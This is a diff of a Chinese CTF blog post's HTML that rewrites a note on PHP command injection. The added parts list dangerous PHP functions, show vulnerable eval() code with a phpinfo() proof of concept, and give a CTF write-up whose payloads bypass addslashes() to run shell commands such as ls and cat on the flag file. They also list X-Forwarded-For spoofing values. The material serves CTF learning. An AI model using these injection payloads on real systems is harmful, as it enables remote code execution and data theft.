@@ -5,9 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="PHP命令注入, 书鱼">
-    <meta name="description" content="一直以为assert函数就是执行一下，今天写了一个代码审计题目，发现了assert代码注入，记录一下一、一些php语法1、ASSERT函数在php文档中描述
-PHP 5
-assert ( mixed $assertion [, string">
+    <meta name="description" content="命令注入额 没啥，类似于一句话木马的官方话吧常见php命令注入函数eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_f">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -385,14 +383,14 @@ assert ( mixed $assertion [, string">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    5 分
                 </div>
                 
 				
@@ -408,19 +406,14 @@ assert ( mixed $assertion [, string">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="一直以为assert函数就是执行一下，今天写了一个代码审计题目，发现了assert代码注入，记录一下"><a href="#一直以为assert函数就是执行一下，今天写了一个代码审计题目，发现了assert代码注入，记录一下" class="headerlink" title="一直以为assert函数就是执行一下，今天写了一个代码审计题目，发现了assert代码注入，记录一下"></a>一直以为assert函数就是执行一下，今天写了一个代码审计题目，发现了assert代码注入，记录一下</h4><h3 id="一、一些php语法"><a href="#一、一些php语法" class="headerlink" title="一、一些php语法"></a>一、一些php语法</h3><p>1、ASSERT函数<br>在php文档中描述</p>
-<pre class=" language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">5</span>
-<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool
-<span class="token constant">PHP</span> <span class="token number">7</span>
-<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre>
-<a id="more"></a>
-<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。以将断言看作是异常处理的一种高级形式。断言表示为一些布尔表达式，程序员相信在程序中的某个特定点该表达式值为真。可以在任何时候启用和禁用断言验证，因此可以在测试时启用断言，而在部署时禁用断言。<br>2、php语句中or的用法</p>
-<pre class=" language-php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"抱歉，无法打开: $filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
-<p>or在这里是这样理解的，因为在PHP中并不区分数据类型，所以$file既可以是int也可以bool，所以这样的语句不会报错。但其处理过程可能有些朋友不大明白。<br>其实在大多数的语言中， bool or bool这样的语句中，如果前一个值为真后一个值就不会再判断了。这里也是的，所以如果fopen函数执行正确的话，会返回一个大于0的int值（这其实就是“真”），后面的语句就不会执行了。如果fopen函数执行失败，就会返回false，那么就会判断后面的表达式是否为真了。<br>结果执行了die()之后，不管返回什么，程序都已经停止执行了，并且显示指定的出错信息，也就达到了调试的目的。 </p>
-<h3 id="二、githack"><a href="#二、githack" class="headerlink" title="二、githack"></a>二、githack</h3><p>项目地址：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a><br>使用还是很暴力的</p>
-<pre><code>GitHack.py http://www.openssl.org/.git/</code></pre><p><img src="1.png" alt=""></p>
-<h3 id="三、PHP命令注入"><a href="#三、PHP命令注入" class="headerlink" title="三、PHP命令注入"></a>三、PHP命令注入</h3><p>额 没啥，类似于一句话木马的官方话吧<br>常见php命令注入函数<br>eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()</p>
-<h3 id="四、题目："><a href="#四、题目：" class="headerlink" title="四、题目："></a>四、题目：</h3><p>jarvios的babyphp<br><img src="2.png" alt=""><br>可以目录扫描一下，有.git文件夹泄露<br><img src="3.png" alt=""><br>通过githack还原源码<br><img src="4.png" alt=""><br>审计发现下面漏洞</p>
+                <h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>额 没啥，类似于一句话木马的官方话吧<br>常见php命令注入函数<br>eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()<br>eval()函数可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$myvar</span> <span class="token operator">=</span> <span class="token string">"varname"</span><span class="token punctuation">;</span>
+    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\$myvar = $x;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>poc<br><code>/index.php?arg=1;phpinfo()</code></p>
+<h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p>jarvios的babyphp<br><img src="2.png" alt=""><br>可以目录扫描一下，有.git文件夹泄露<br><img src="3.png" alt=""><br>通过githack还原源码<br><img src="4.png" alt=""><br>审计发现下面漏洞</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"templates/"</span> <span class="token punctuation">.</span> <span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">".php"</span><span class="token punctuation">;</span>
 <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"strpos('$file', '..') === false"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Detected hacking attempt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"file_exists('$file')"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"That file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
@@ -489,7 +482,29 @@ cookies <span class="token operator">=</span> dict<span class="token punctuation
     <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span>
         <span class="token keyword">break</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>database<span class="token punctuation">)</span></code></pre>
+<h4 id="“百度杯”CTF比赛-十月场-hash"><a href="#“百度杯”CTF比赛-十月场-hash" class="headerlink" title="“百度杯”CTF比赛 十月场 hash"></a>“百度杯”CTF比赛 十月场 hash</h4><p>通过别的途径获得源码 得到</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'$value="'</span> <span class="token punctuation">.</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hahaha!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
+<span class="token delimiter">?></span></code></pre>
+<p>首先 addslashes() 函数<br>在每个双引号（”）前添加反斜杠：</p>
+<pre><code>&lt;?php 
+$str = addslashes(&#39;Shanghai is the &quot;biggest&quot; city in China.&#39;);
+echo($str); 
+?&gt; 
+输出
+Shanghai is the \&quot;biggest\&quot; city in China.  </code></pre><p>poc</p>
+<pre><code>?val=${eval($_GET[a])}&amp;a=echo `ls`;
+?val=${eval($_GET[a])}&amp;a=echo `cat True_F1ag_i3_Here_233.php| base64`;</code></pre><h4 id="X-Forwarded-For可选地址"><a href="#X-Forwarded-For可选地址" class="headerlink" title="X-Forwarded-For可选地址"></a>X-Forwarded-For可选地址</h4><pre><code>192.168.0.0
+172.16.0.0
+10.0.0.0
+127.0.0.0
+localhost</code></pre>
             </div>
             <hr/>
 
@@ -832,7 +847,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">148.9k</span>&nbsp;字
+                class="white-color">148.8k</span>&nbsp;字
             
             
             
